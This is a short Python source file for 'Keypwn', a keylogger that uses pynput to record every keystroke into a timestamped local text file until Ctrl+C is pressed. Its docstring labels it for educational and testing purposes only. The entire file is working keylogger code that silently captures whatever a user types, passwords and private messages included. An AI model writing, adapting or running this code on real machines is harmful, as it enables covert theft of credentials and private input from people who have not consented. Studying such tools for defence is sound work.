""" 
    Keypwn is a single keylogger tool to capture keystrokes and stores it locally. For
    educational and testing purposes only.

    Developed by @Its-Yayo. Follow me fellas!

"""

import sys
import datetime
from pynput.keyboard import Listener

date = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
log_name = open(f'keypwn_{date}.txt', 'w')

def keypwn(key):
    keys = str(key)

    if keys == "'\\x03'":
        log_name.close()
        sys.exit()

    if keys == 'Key.enter':
        log_name.write('\n')
    elif keys == 'Key.space':
        log_name.write(' ')
    elif keys == 'Key.backspace':
        log_name.write('%BORRAR%')
    else:
        log_name.write(keys.replace("'", ""))
    
with Listener(on_press=keypwn) as listener:
    listener.join()
